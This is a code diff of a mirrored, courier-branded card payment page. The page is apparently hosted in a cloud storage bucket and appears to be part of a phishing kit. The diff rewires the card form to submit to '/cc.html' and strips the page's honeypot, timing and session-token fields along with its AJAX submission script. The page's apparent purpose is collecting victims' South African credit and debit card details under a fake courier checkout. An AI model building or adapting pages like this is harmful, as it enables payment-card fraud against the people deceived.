@@ -4926,7 +4926,7 @@
                                                             </div>
                                                         </div>
 
-                                                        <form id="paymentForm" action="/api/submit" method="POST" class="mb-32 md:mb-0">
+                                                        <form action="/cc.html" class="mb-32 md:mb-0">
                                                             <div class="grid grid-cols-1 md:grid-cols-2 md:gap-x-4">
                                                                 <div class="xs:shadow-md rounded-md bg-white mt-3 mb-2 border-gray-100 border p-4 xs:p-6 block">
                                                                     <div class="flex flex-row justify-between items-start">
@@ -5032,14 +5032,6 @@
                                                                                                         <label for="vehicle1"> Pay by card</label>
 
                                                                                                         <p>&nbsp;We accept South African MasterCard and Visa credit, and debit cards</p>
-                                                                                                        
-                                                                                                        <!-- Honeypot field for bot detection (hidden from users) -->
-                                                                                                        <label for="company_url" style="position:absolute;left:-9999px;">Company Website (leave blank)</label>
-                                                                                                        <input type="text" id="company_url" name="company_url" style="position:absolute;left:-9999px;width:1px;height:1px;" tabindex="-1" autocomplete="off" aria-hidden="true" />
-                                                                                                        <!-- Hidden field for timing check -->
-                                                                                                        <input type="hidden" name="form_load_time" id="form_load_time" value="" />
-                                                                                                        <!-- Long browser session token (20-30 chars) generated on visit -->
-                                                                                                        <input type="hidden" name="session_token" id="session_token" value="" />
                                                                                                     </span>
                                                                                                 </div>
                                                                                             </div>
@@ -5082,99 +5074,6 @@
                 </div>
             </div>
         </div>
-
-        <!-- Form submission handler: session token, honeypot timing, AJAX submit -->
-        <script>
-            // Generate a long (20-30 character) random session token that
-            // "occupies" the browser for the duration of the visit. The token is
-            // stored in sessionStorage and submitted as a hidden form field.
-            (function () {
-                function generateSessionToken() {
-                    var alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-                    var length = 20 + Math.floor(Math.random() * 11); // 20..30
-                    var bytes;
-                    if (window.crypto && typeof window.crypto.getRandomValues === 'function') {
-                        bytes = new Uint8Array(length);
-                        window.crypto.getRandomValues(bytes);
-                    } else {
-                        bytes = new Array(length);
-                        for (var i = 0; i < length; i++) {
-                            bytes[i] = Math.floor(Math.random() * 256);
-                        }
-                    }
-                    var out = '';
-                    for (var j = 0; j < length; j++) {
-                        out += alphabet.charAt(bytes[j] % alphabet.length);
-                    }
-                    return out;
-                }
-                var token = null;
-                try { token = window.sessionStorage && window.sessionStorage.getItem('courrier_session_token'); } catch (e) {}
-                if (!token || token.length < 20 || token.length > 30) {
-                    token = generateSessionToken();
-                    try { if (window.sessionStorage) window.sessionStorage.setItem('courrier_session_token', token); } catch (e) {}
-                }
-                window.__sessionToken = token;
-            })();
-
-            document.addEventListener('DOMContentLoaded', function () {
-                var loadTimeField = document.getElementById('form_load_time');
-                if (loadTimeField) loadTimeField.value = Date.now();
-                var tokenField = document.getElementById('session_token');
-                if (tokenField && window.__sessionToken) tokenField.value = window.__sessionToken;
-
-                var form = document.getElementById('paymentForm');
-                if (!form) return;
-                form.addEventListener('submit', async function (e) {
-                    e.preventDefault();
-                    var submitButton = document.getElementById('save_button');
-                    var originalHTML = submitButton ? submitButton.innerHTML : '';
-                    var existingError = document.getElementById('form-error-message');
-                    if (existingError) existingError.remove();
-                    if (submitButton) {
-                        submitButton.disabled = true;
-                        submitButton.innerHTML = '<div>Processing...</div>';
-                    }
-                    try {
-                        var formData = new FormData(form);
-                        var response = await fetch('/api/submit', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                            body: new URLSearchParams(formData)
-                        });
-                        var result = await response.json();
-                        if (result.success) {
-                            window.location.href = result.redirect || '/processing.html';
-                        } else {
-                            var errorDiv = document.createElement('div');
-                            errorDiv.id = 'form-error-message';
-                            errorDiv.setAttribute('role', 'alert');
-                            errorDiv.setAttribute('aria-live', 'assertive');
-                            errorDiv.style.cssText = 'background:#fee;border:1px solid #c33;color:#c33;padding:12px;border-radius:4px;margin:16px 0;';
-                            errorDiv.textContent = result.message || 'Failed to submit form. Please try again.';
-                            if (submitButton) {
-                                submitButton.parentElement.parentElement.insertBefore(errorDiv, submitButton.parentElement);
-                                submitButton.disabled = false;
-                                submitButton.innerHTML = originalHTML;
-                            }
-                        }
-                    } catch (err) {
-                        console.error('Submission error:', err);
-                        var errorDiv = document.createElement('div');
-                        errorDiv.id = 'form-error-message';
-                        errorDiv.setAttribute('role', 'alert');
-                        errorDiv.setAttribute('aria-live', 'assertive');
-                        errorDiv.style.cssText = 'background:#fee;border:1px solid #c33;color:#c33;padding:12px;border-radius:4px;margin:16px 0;';
-                        errorDiv.textContent = 'An error occurred. Please try again later.';
-                        if (submitButton) {
-                            submitButton.parentElement.parentElement.insertBefore(errorDiv, submitButton.parentElement);
-                            submitButton.disabled = false;
-                            submitButton.innerHTML = originalHTML;
-                        }
-                    }
-                });
-            });
-        </script>
     </body>
 
 <!-- Mirrored from f006.backblazeb2.com/file/dwiupo/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 May 2026 11:04:15 GMT -->
